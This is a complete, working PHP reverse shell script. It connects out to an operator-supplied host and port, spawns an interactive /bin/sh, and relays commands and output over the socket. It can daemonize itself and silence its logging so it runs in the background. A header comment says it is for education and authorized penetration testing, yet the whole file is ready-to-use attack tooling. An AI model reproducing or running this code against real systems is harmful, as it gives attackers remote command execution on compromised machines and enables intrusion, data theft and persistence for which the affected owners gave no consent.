<?php

declare(strict_types=1);

/**
 * A modern, robust reverse shell implementation in PHP.
 *
 * This script connects back to a listening server and provides shell access.
 * It is intended for educational and authorized penetration testing purposes only.
 *
 * Usage: php reverse_shell.php -h <HOST> -p <PORT> [-s <SHELL>] [--daemonize]
 */
final class ReverseShell
{
    private const DEFAULT_SHELL = '/bin/sh -i';
    private const CHUNK_SIZE = 8192; // Increased from 1400 for better performance

    private readonly string $host;
    private readonly int $port;
    private readonly string $shellCmd;

    /** @var resource|null The network socket connection. */
    private $socket = null;

    /** @var resource|null The shell process resource. */
    private $process = null;

    /** @var array<int, resource> Pipes for shell's stdin, stdout, stderr. */
    private array $pipes = [];

    private bool $isDaemonized = false;

    public function __construct(
        string $host,
        int $port,
        string $shellCmd = self::DEFAULT_SHELL
    ) {
        $this->host = $host;
        $this->port = $port;
        $this->shellCmd = $shellCmd;
    }

    /**
     * Attempts to daemonize the process.
     */
    public function daemonize(): void
    {
        $this->log('Attempting to daemonize...');
        if (!function_exists('pcntl_fork')) {
            $this->log(
                'Warning: pcntl_fork() not available. Cannot daemonize.',
                'warning'
            );
            return;
        }

        $pid = pcntl_fork();
        if ($pid === -1) {
            throw new \RuntimeException("Failed to fork process.");
        }

        if ($pid > 0) {
            // Parent process exits successfully.
            exit(0);
        }

        if (posix_setsid() === -1) {
            throw new \RuntimeException("Could not set session ID.");
        }

        $this->isDaemonized = true;
        $this->log('Successfully daemonized.');

        // Close standard file descriptors
        fclose(STDIN);
        fclose(STDOUT);
        fclose(STDERR);
    }

    /**
     * Executes the main logic of the reverse shell.
     */
    public function run(): void
    {
        try {
            $this->establishConnection();
            $this->spawnShell();
            $this->eventLoop();
        } catch (\Throwable $e) {
            $this->log("Error: {$e->getMessage()}", 'error');
        } finally {
            $this->cleanup();
        }
    }

    /**
     * Establishes the reverse TCP connection.
     */
    private function establishConnection(): void
    {
        $this->log("Connecting to {$this->host}:{$this->port}...");
        $this->socket = @fsockopen($this->host, $this->port, $errno, $errstr, 30);
        if (!$this->socket) {
            throw new \RuntimeException("Socket error: {$errstr} ({$errno})");
        }
        stream_set_blocking($this->socket, false);
        $this->log('Connection established.');
    }

    /**
     * Spawns the interactive shell process.
     */
    private function spawnShell(): void
    {
        $this->log("Spawning shell: {$this->shellCmd}");
        $descriptorSpec = [
            0 => ['pipe', 'r'], // stdin
            1 => ['pipe', 'w'], // stdout
            2 => ['pipe', 'w'], // stderr
        ];

        $this->process = proc_open($this->shellCmd, $descriptorSpec, $this->pipes);
        if (!is_resource($this->process)) {
            throw new \RuntimeException('Failed to spawn shell process.');
        }

        foreach ($this->pipes as $pipe) {
            stream_set_blocking($pipe, false);
        }
    }

    /**
     * The main event loop to proxy data between the socket and the shell.
     */
    private function eventLoop(): void
    {
        $this->log('Entering event loop...');
        while (true) {
            if ($this->shouldExit()) {
                break;
            }

            $read = [$this->socket, $this->pipes[1], $this->pipes[2]];
            $write = null;
            $except = null;

            // Wait for activity on any of the streams
            $activity = stream_select($read, $write, $except, null);
            if ($activity === false) {
                $this->log('stream_select() failed.', 'warning');
                break;
            }

            // Data from listener -> shell stdin
            if (in_array($this->socket, $read)) {
                $data = fread($this->socket, self::CHUNK_SIZE);
                if ($data !== false && $data !== '') {
                    fwrite($this->pipes[0], $data);
                }
            }

            // Data from shell stdout/stderr -> listener
            foreach ([$this->pipes[1], $this->pipes[2]] as $pipe) {
                if (in_array($pipe, $read)) {
                    $data = fread($pipe, self::CHUNK_SIZE);
                    if ($data !== false && $data !== '') {
                        fwrite($this->socket, $data);
                    }
                }
            }
        }
    }

    /**
     * Checks for termination conditions.
     */
    private function shouldExit(): bool
    {
        if (!is_resource($this->socket) || feof($this->socket)) {
            $this->log('Socket connection closed by remote host.');
            return true;
        }
        if (!is_resource($this->process) || !proc_get_status($this->process)['running']) {
            $this->log('Shell process has terminated.');
            return true;
        }
        return false;
    }

    /**
     * Cleans up all open resources.
     */
    private function cleanup(): void
    {
        $this->log('Cleaning up resources...');
        if (is_resource($this->socket)) {
            fclose($this->socket);
        }
        foreach ($this->pipes as $pipe) {
            if (is_resource($pipe)) {
                fclose($pipe);
            }
        }
        if (is_resource($this->process)) {
            proc_close($this->process);
        }
    }

    /**
     * Logs messages to STDERR, unless daemonized.
     */
    private function log(string $message, string $level = 'info'): void
    {
        if ($this->isDaemonized) {
            return;
        }
        $prefix = strtoupper($level);
        // Writing to STDERR is standard for CLI tool diagnostics
        fwrite(STDERR, "[$prefix] $message" . PHP_EOL);
    }
}

// --- Runner ---

/**
 * Displays the help message and exits.
 */
function show_help(): void
{
    echo "PHP Reverse Shell - Modernized Version\n\n";
    echo "Usage: php " . basename(__FILE__) . " [options]\n\n";
    echo "Options:\n";
    echo "  -h <host>      The IP address of the listening machine (required).\n";
    echo "  -p <port>      The port on the listening machine (required).\n";
    echo "  -s <shell>     The shell to execute (default: '/bin/sh -i').\n";
    echo "  --daemonize    Run the process in the background.\n";
    echo "  --help         Display this help message.\n\n";
    exit(0);
}

// Main execution logic
if (PHP_SAPI !== 'cli') {
    die('This script must be run from the command line.');
}

$options = getopt('h:p:s:', ['daemonize', 'help']);

if (isset($options['help']) || !isset($options['h']) || !isset($options['p'])) {
    show_help();
}

$host = $options['h'];
$port = (int) $options['p'];
$shellCmd = $options['s'] ?? ReverseShell::DEFAULT_SHELL;
$daemonize = isset($options['daemonize']);

set_time_limit(0);
umask(0);
chdir('/');

try {
    $shell = new ReverseShell($host, $port, $shellCmd);
    if ($daemonize) {
        $shell->daemonize();
    }
    $shell->run();
} catch (\Throwable $e) {
    // Final catch-all for errors during setup
    fwrite(STDERR, "[FATAL] {$e->getMessage()}" . PHP_EOL);
    exit(1);
}
